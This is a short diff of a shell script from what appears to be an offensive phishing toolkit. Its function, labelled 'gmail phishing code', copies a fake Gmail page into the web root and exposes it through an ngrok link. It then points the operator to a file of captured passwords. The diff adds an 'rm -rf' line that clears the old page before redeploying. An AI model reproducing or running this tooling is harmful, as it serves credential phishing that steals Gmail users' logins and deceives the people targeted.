@@ -99,6 +99,7 @@ check_web(){
 #################gmail phishing code #############
 phish(){
 	#unzip gmail.zip
+	rm -rf /var/www/html/gmail
 	cp -r gmail /var/www/html
 	printf "\e[1;93m You can Look pass file on new terminal \e[1;91m\"cat /var/www/html/gmail/msf-lazy.txt\" ... \n\e[0m"
 	printf "\e[1;92m Phishing link is : http://ngrok_domain/gmail \n\e[0m"
